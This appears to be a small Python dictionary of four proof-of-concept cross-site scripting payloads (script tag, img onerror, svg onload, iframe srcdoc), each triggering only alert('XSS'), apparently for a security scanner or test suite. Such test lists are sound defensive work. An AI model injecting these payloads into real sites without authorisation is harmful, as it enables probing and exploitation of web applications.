payloads = {
    "XSS": {
        "script_alert": "<script>alert('XSS');</script>",
        "img_onerror": "<img src='x' onerror='alert(\"XSS\")'>",
        "svg_onload": "<svg onload='alert(\"XSS\")'></svg>",
        "iframe_srcdoc": "<iframe srcdoc='<script>alert(\"XSS\")</script>'></iframe>"
    },
}